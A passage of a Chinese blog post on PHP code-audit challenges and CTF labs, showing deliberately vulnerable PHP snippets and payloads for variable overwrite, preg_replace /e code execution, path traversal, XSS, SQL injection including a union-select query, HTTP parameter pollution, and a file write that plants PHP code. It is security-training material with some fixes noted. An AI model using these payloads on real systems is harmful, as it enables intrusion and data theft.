class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function getUser($id) &#123;</span><br><span class="line">global $config, $db;</span><br><span class="line">if (!is_resource($db)) &#123;</span><br><span class="line">    $db = new MySQLi(</span><br><span class="line">    $config[&apos;dbhost&apos;],</span><br><span class="line">    $config[&apos;dbuser&apos;],</span><br><span class="line">    $config[&apos;dbpass&apos;],</span><br><span class="line">    $config[&apos;dbname&apos;]</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">$sql = &quot;SELECT username FROM users WHERE id = ?&quot;;</span><br><span class="line">$stmt = $db-&gt;prepare($sql);</span><br><span class="line">$stmt-&gt;bind_param(&apos;i&apos;, $id);</span><br><span class="line">$stmt-&gt;bind_result($name);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;fetch();</span><br><span class="line">return $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</span><br><span class="line">parse_str($var[&apos;query&apos;]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line">echo &apos;&lt;h1&gt;&apos;.htmlspecialchars($currentUser).&apos;&lt;/h1&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>漏洞点在<code>parse_str($var[&#39;query&#39;]);</code>，其变量覆盖导致可以被修改mysql数据库配置，让其连上我们的数据库然后绕过权限验证。</p><p>漏洞产生的原因为没有设置第二个参数，即将结果存入<code>result</code>，而是直接将变量解析到当前作用域<br><img src="http://static.zybuluo.com/Passer6y/slg06ki3m57bgaixjfd6atw2/image_1d3niv8ke7cu1s2s1fgrktp2hp2a.png" alt="image_1d3niv8ke7cu1s2s1fgrktp2hp2a.png-134.5kB"></p><p>demo：<br><img src="http://static.zybuluo.com/Passer6y/9eipav2xugz2kp249cyx2dg5/image_1d3nj88nbsljvhl7m2pgk18rs2q.png" alt="image_1d3nj88nbsljvhl7m2pgk18rs2q.png-42.2kB"></p><p>同样产生变量覆盖的问题还有：<br><code>$$</code>产生变量覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">$k = $_GET[&apos;k&apos;];</span><br><span class="line">$v = $_GET[&apos;v&apos;];</span><br><span class="line">$$k = $v;</span><br><span class="line">echo $a;</span><br><span class="line">//  修复办法即注册变量前检测是否变量已存在</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/t4k314pbj1ecp0oegh8gk90a/image_1d3nmigvl10pk34r1s5ioj03f637.png" alt="image_1d3nmigvl10pk34r1s5ioj03f637.png-47.9kB"></p><p>以及<code>extract()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;</span><br><span class="line">extract(array(&quot;a&quot;=&gt;&quot;3&quot;));</span><br><span class="line">//修复：extract(array(&quot;a&quot;=&gt;&quot;3&quot;),EXTR_SKIP);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/6gi9ze7xkf2elykbio9wrpgt/image_1d3nmm0q81ead1eh1m687fn19e69.png" alt="image_1d3nmm0q81ead1eh1m687fn19e69.png-37.2kB"></p><p>红日安全提供的练习题：<a href="https://xz.aliyun.com/t/2541" target="_blank" rel="noopener">https://xz.aliyun.com/t/2541</a></p><p>第一关<code>parse_str</code>变量覆盖，弱类型比较绕过<br><img src="http://static.zybuluo.com/Passer6y/dbwz9a034h9xfikymfepzf74/image_1d3nn5vd2m04cnk1ursitq1aorp.png" alt="image_1d3nn5vd2m04cnk1ursitq1aorp.png-78.1kB"></p><p><img src="http://static.zybuluo.com/Passer6y/oia9xew1tx2w9hnsg8983ho8/image_1d3nn80inv081ebo1qgs1ebr1mtf16.png" alt="image_1d3nn80inv081ebo1qgs1ebr1mtf16.png-33kB"></p><p>第二关条件竞争，利用0.1秒时间差，一个疯狂生成文件，一个调大线程去访问即可。</p><p><img src="http://static.zybuluo.com/Passer6y/m58wps2ywloog39aa5dmoeek/image_1d3no5lvl1grt19ap160590hjp11j.png" alt="image_1d3no5lvl1grt19ap160590hjp11j.png-470.1kB"></p><blockquote><p>其实测试了一下这里不加usleep函数也能成功拿到flag，只是概率小了一些而已</p></blockquote><h2 id="Day-8-Candle"><a href="#Day-8-Candle" class="headerlink" title="Day 8 - Candle"></a>Day 8 - Candle</h2><p>考察：<code>preg_replace()</code>e修饰符代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/plain&quot;);</span><br><span class="line"></span><br><span class="line">function complexStrtolower($regex, $value) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &apos;/(&apos; . $regex . &apos;)/ei&apos;,</span><br><span class="line">        &apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $regex =&gt; $value) &#123;</span><br><span class="line">    echo complexStrtolower($regex, $value) . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>preg_replace()</code>e修饰符，第二个参数可造成代码执行<br>这里由于第二个参数用的双引号，可导致<code>{${phpinfo()}}</code>该特殊的可变变量被执行。</p><p>正则的反向引用：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p><p>关于反向引用的理解：<br><a href="https://blog.csdn.net/lxcnn/article/details/4146148" target="_blank" rel="noopener">https://blog.csdn.net/lxcnn/article/details/4146148</a><br><a href="https://blog.csdn.net/lxcnn/article/details/4476746" target="_blank" rel="noopener">https://blog.csdn.net/lxcnn/article/details/4476746</a><br><img src="http://static.zybuluo.com/Passer6y/dtp1etua594jkbsz05iihhpv/image_1d3ih2r5hidne3c1mlf9p5b0g56.png" alt="image_1d3q2mpsmlkv1iqubhop031m009.png-71.9kB"></p><p>payload：<br><code>http://127.0.0.1/?\S*={${phpinfo()}}</code></p><h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><p>考察<code>str_replace()</code>过滤不严<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class LanguageManager &#123;</span><br><span class="line">  public function loadLanguage() &#123;</span><br><span class="line">    $lang = $this-&gt;getBrowserLanguage();</span><br><span class="line">    $sanitizedLang = $this-&gt;sanitizeLanguage($lang);</span><br><span class="line">    require_once(&quot;/lang/$sanitizedLang&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private function getBrowserLanguage() &#123;</span><br><span class="line">    $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;en&apos;;</span><br><span class="line">    return $lang;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private function sanitizeLanguage($language) &#123;</span><br><span class="line">    return str_replace(&apos;../&apos;, &apos;&apos;, $language);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure></p><p>payload：<code>..././</code>或<code>....//</code></p><p>如果过滤方式为:<br><code>str_replace(array(&#39;../&#39;,&#39;./&#39;), &#39;&#39;, $dir);</code><br>我们可以构造这样的payload：<code>.....///</code>=&gt;<code>../</code>来进行目录遍历</p><p>修复方案：<br>可以使用递归的过滤，或者：<code>str_replace(&#39;..&#39;, &#39;&#39;, $language)</code></p><p>红日安全提供的ctf题目：<a href="https://xz.aliyun.com/t/2633" target="_blank" rel="noopener">https://xz.aliyun.com/t/2633</a><br>利用变量覆盖绕过<code>addslashes</code>的引号限制从而导致注入：<br><img src="http://static.zybuluo.com/Passer6y/wcjdyanwu9lvmpqvlogukv0w/image_1d3qmqkjf178f1cn1n0n8up1ueap.png" alt="image_1d3qmqkjf178f1cn1n0n8up1ueap.png-104.6kB"></p><h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">function goAway() &#123;</span><br><span class="line">  error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">  header(&apos;Location: /error/&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">  goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!assert(&quot;(int)$pi == 3&quot;)) &#123;</span><br><span class="line">  echo &quot;This is not pi.&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &quot;This might be pi.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序未<code>exit()</code>，加上变量覆盖导致代码执行。<br>payload:<code>pi=phpinfo()</code></p><h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">  $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(function ($key, $value) &#123;</span><br><span class="line">  return $key . &apos;=&apos; . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(&apos;&amp;&apos;, $queryParts);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;a href=&apos;/images/size.php?&quot; .</span><br><span class="line">  htmlentities($query) . &quot;&apos;&gt;link&lt;/a&gt;&quot;;</span><br></pre></td></tr></table></figure><p><code>htmlentities</code>函数使用不当，加上intval只对数组的值进行转换，没有对键进行转换，导致xss。</p><p>htmlentities：功能即编码一些特殊符号<br><img src="http://static.zybuluo.com/Passer6y/zjlvtemct4li0jea79xsssv8/image_1d3vpoh3krnl1ok560q1dbttm41p.png" alt="image_1d3vpoh3krnl1ok560q1dbttm41p.png-96kB"></p><p>但是第二个参数的默认配置会不编码单引号，这就导致了这里单引号被闭合<br><img src="http://static.zybuluo.com/Passer6y/rajqkxcgrqblumasvmmz43aj/image_1d3vqcgad1t6d1br21cf21ce91kdr2m.png" alt="image_1d3vqcgad1t6d1br21cf21ce91kdr2m.png-48.9kB"></p><p>payload:<code>?a&#39;onclick=alert(1)//=c</code><br><img src="http://static.zybuluo.com/Passer6y/3lyw1fc6ke66ucor9019bp2w/image_1d3vqg23oj33jgi135v3vpo1453.png" alt="image_1d3vqg23oj33jgi135v3vpo1453.png-67.8kB"></p><p>红日安全提供的ctf题：<a href="https://github.com/hongriSec/PHP-Audit-Labs/tree/master/Part1/Day12/files" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs/tree/master/Part1/Day12/files</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&apos;username&apos;]))&#123;</span><br><span class="line">    if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;username&apos;]))&#123;</span><br><span class="line">        die(&quot;Attack detected!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&apos;password&apos;]))&#123;</span><br><span class="line">    if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;password&apos;]))&#123;</span><br><span class="line">        die(&quot;Attack detected!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $query;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($query,$con);</span><br><span class="line">//var_dump($result);</span><br><span class="line">while($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>和之前不一样的是，这里同样用了<code>htmlentities</code>进行编码转换，这里配置了<code>ENT_QUOTES</code>，使得单双引号都会被转义，无法闭合sql语句。但是因为没有过滤<code>\</code>，使得我们可以转义单引号：<br><img src="http://static.zybuluo.com/Passer6y/8mmh8fl91lte0qwecyqtw3lk/image_1d3vu2m5e17fc1aj5hq61snktn05g.png" alt="image_1d3vu2m5e17fc1aj5hq61snktn05g.png-91kB"></p><p>后来看wp还有一种有意思思路：<a href="https://xz.aliyun.com/t/2829#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2829#toc-4</a></p><p>仔细看我们会发现过滤的时候使用的是<code>$_REQUEST</code>来获取参数，而获取查库操作的变量以<code>$_GET</code>形式引入，这里有一个看似不起眼的差异。</p><p>在<code>php.ini</code>中，因为<code>$_REQUEST</code>和gpc有共同之处，而下图中<code>GPCS</code>即<code>$_REQUEST</code>加载流程,G:Get，P:Post，C:Cookie，S:Server。<br><img src="http://static.zybuluo.com/Passer6y/mlr70dib11d09xkhjv7k5dgo/image_1d3vvnkl06g91nu31hb114pta43m.png" alt="image_1d3vvnkl06g91nu31hb114pta43m.png-100.4kB"></p><p>可以知道post在get之后，如果我们同时传入get和post相同参数，则<code>$_REQUEST</code>获取到的是post，固然我们就可以利用这个点绕过过滤限制。<br><img src="http://static.zybuluo.com/Passer6y/4ug183q5d3k0dj1tefv42zx7/image_1d3vvgq6o4n51q37kf2eoc1fdf9.png" alt="image_1d3vvgq6o4n51q37kf2eoc1fdf9.png-98.6kB"></p><h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">class LoginManager &#123;</span><br><span class="line">  private $em;</span><br><span class="line">  private $user;</span><br><span class="line">  private $password;</span><br><span class="line"></span><br><span class="line">  public function __construct($user, $password) &#123;</span><br><span class="line">    $this-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    $this-&gt;user = $user;</span><br><span class="line">    $this-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function isValid() &#123;</span><br><span class="line">    $user = $this-&gt;sanitizeInput($this-&gt;user);</span><br><span class="line">    $pass = $this-&gt;sanitizeInput($this-&gt;password);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(&quot;COUNT(p)&quot;)</span><br><span class="line">      -&gt;from(&quot;User&quot;, &quot;u&quot;)</span><br><span class="line">      -&gt;where(&quot;user = &apos;$user&apos; AND password = &apos;$pass&apos;&quot;);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    return boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function sanitizeInput($input, $length = 20) &#123;</span><br><span class="line">    $input = addslashes($input);</span><br><span class="line">    if (strlen($input) &gt; $length) &#123;</span><br><span class="line">      $input = substr($input, 0, $length);</span><br><span class="line">    &#125;</span><br><span class="line">    return $input;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = new LoginManager($_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);</span><br><span class="line">if (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个点和day12有相似之处，这段代码虽然使用了<code>addslashes()</code>函数来转义引号，问题出在他会用<code>substr()</code>截断长度大于20的部分，所以我们可以像day12中一样，利用substr将<code>\&#39;</code>的<code>&#39;</code>给截断掉，导致转义原本的单引号，然后就可以注入了。当然这类漏洞局限就是一般存在于双条件查询的页面。</p><p>红日安全提供的练习题：<a href="https://xz.aliyun.com/t/2864" target="_blank" rel="noopener">https://xz.aliyun.com/t/2864</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line">  function dhtmlspecialchars($string) &#123;</span><br><span class="line">      if (is_array($string)) &#123;</span><br><span class="line">          foreach ($string as $key =&gt; $val) &#123;</span><br><span class="line">              $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;(&apos;, &apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;, &apos;（&apos;, &apos;）&apos;), $string);</span><br><span class="line">          if (strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">              $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return $string;</span><br><span class="line">  &#125;</span><br><span class="line">  function dowith_sql($str) &#123;</span><br><span class="line">      $check = preg_match(&apos;/select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&apos;, $str);  </span><br><span class="line">      if ($check) &#123;</span><br><span class="line">          echo &quot;非法字符!&quot;;</span><br><span class="line">          exit();</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">  // 经过第一个waf处理</span><br><span class="line">  foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">      $_REQUEST[$key] = dowith_sql($value);     // 用相同参数的$_POST去覆盖掉$_GET</span><br><span class="line">  &#125;</span><br><span class="line">  // 经过第二个WAF处理</span><br><span class="line">  $request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]);     //  这里拿到的是$_GET</span><br><span class="line">  if (isset($request_uri[1])) &#123;</span><br><span class="line">      $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class="line">      foreach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class="line">          $_value = explode(&quot;=&quot;, $value);</span><br><span class="line">          if (isset($_value[1])) &#123;</span><br><span class="line">              $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));    // 没过滤键，只过滤了value</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  // 业务处理</span><br><span class="line">  if (isset($_REQUEST[&apos;submit&apos;])) &#123;</span><br><span class="line">      $user_id = $_REQUEST[&apos;i_d&apos;];</span><br><span class="line">      $sql = &quot;select * from phpAuditLabs.users where id=$user_id&quot;;</span><br><span class="line"></span><br><span class="line">      echo $sql;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line"></span><br><span class="line">      while($row = mysql_fetch_array($result))</span><br><span class="line">      &#123;</span><br><span class="line">          echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同样也是<code>$_REQUEST</code>获取参数覆盖问题同day12，相同参数名时<code>$_POST</code>会覆盖掉<code>$_GET</code>，而在其处理<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>再一次对uri中的参数给<code>$_REQUEST</code>进行注册，并且没有校验sql注入。</p><p><img src="http://static.zybuluo.com/Passer6y/yp4ttx4kyvvic78ln2evi893/image_1d438df6p14hrkav68dpvo1if29.png" alt="image_1d438df6p14hrkav68dpvo1if29.png-93kB"></p><p>这里还有一种解法就是利用http参数污染漏洞，思路和day14一致。</p><h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><p>考点：变量覆盖及目录遍历getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Carrot &#123;</span><br><span class="line">const EXTERNAL_DIRECTORY = &apos;/tmp/&apos;;</span><br><span class="line">private $id;</span><br><span class="line">private $lost = 0;</span><br><span class="line">private $bought = 0;</span><br><span class="line"></span><br><span class="line">public function __construct($input) &#123;</span><br><span class="line">$this-&gt;id = rand(1, 1000);</span><br><span class="line"></span><br><span class="line">foreach ($input as $field =&gt; $count) &#123;</span><br><span class="line">$this-&gt;$field = $count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">file_put_contents(</span><br><span class="line">self::EXTERNAL_DIRECTORY . $this-&gt;id,</span><br><span class="line">var_export(get_object_vars($this), true)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = new Carrot($_GET);</span><br></pre></td></tr></table></figure><p>payload:<code>../11.php&amp;shell=1&#39;,)%0a&lt;%3fphp+phpinfo();?&gt;//</code><br><img src="http://static.zybuluo.com/Passer6y/ju62doak96loyqqimqg02rbh/image_1d446uhvl1ea7jemrqq1k431jqpm.png" alt="image_1d446uhvl1ea7jemrqq1k431jqpm.png-92.2kB"><br><img src="http://static.zybuluo.com/Passer6y/mv9f6llmgdm639asql5x3c9d/image_1d446ursn18gu3e6etdf4e1qbe13.png" alt="image_1d446ursn18gu3e6etdf4e1qbe13.png-117.8kB"></p><p>红日安全提供的ctf题： <a href="https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ</a> 密码: 59t2</p><p>这个题的漏洞关键在于<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>和<code>$_GET</code>处理<code>空格</code>、<code>.</code>、<code>[</code>的差异造成。</p><p><code>$_GET</code>变量在处理参数的时候，会将参数名中的<code>空格</code>、<code>.</code>、<code>[</code>替换成<code>_</code>，而<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>不会，这就在注册变量的时候产生了一个差异。这种漏洞称为HPP（HTTP Parameter Pollution）<br>demo:<br><img src="http://static.zybuluo.com/Passer6y/mnv17hiau6cokq72ix5wb680/image_1d44f8l23de11rdtajdiht1pif5g.png" alt="image_1d44f8l23de11rdtajdiht1pif5g.png-130.7kB"></p><p>payload:<br><code>?message_id=-1 union select 1,flag,3,4 from flag&amp;message.id=1</code><br><img src="http://static.zybuluo.com/Passer6y/yad81lg5fbcwmqu6039z0mop/image_1d44dno9m1j0p1961kjq52411p033.png" 